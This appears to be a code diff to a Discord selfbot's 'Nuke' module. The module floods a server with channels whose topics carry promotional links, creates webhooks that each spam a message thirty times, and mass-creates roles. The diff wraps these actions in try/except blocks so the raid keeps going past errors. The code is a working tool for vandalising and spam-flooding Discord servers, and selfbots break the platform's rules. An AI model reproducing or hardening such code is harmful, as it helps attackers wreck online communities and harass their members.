@@ -18,13 +18,16 @@ async def check(ctx):
 	except:	pass
 	return True
 async def create_channel(guild, name):
-	await guild.create_text_channel(name=name, topic='**__Selfbot by LALOL https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot__**')
+	try:await guild.create_text_channel(name=name, topic='**__Selfbot by LALOL https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot__**')
+	except:pass
 async def create_webhook(channel, message):
-	webhook=await channel.create_webhook(name='Selfbot by LALOL')
+	try:webhook=await channel.create_webhook(name='Selfbot by LALOL')
+	except:pass
 	create_task(spam(webhook, message))
 async def spam(webhook, message):
 	for i in range(30):
-		await webhook.send(message)
+		try:await webhook.send(message)
+		except:pass
 class Nuke(commands.Cog):
 	def __init__(self, bot):
 		self.bot = bot
@@ -63,7 +66,8 @@ class Nuke(commands.Cog):
 	async def spamroles(self, ctx, *, name='Selfbot by LALOL'):
 		if await check(ctx):
 			for i in range(50):
-				await ctx.guild.create_role(name=name)
+				try:await ctx.guild.create_role(name=name)
+				except:return
 	@commands.command()
 	async def nuke(self, ctx):
 		if await check(ctx):
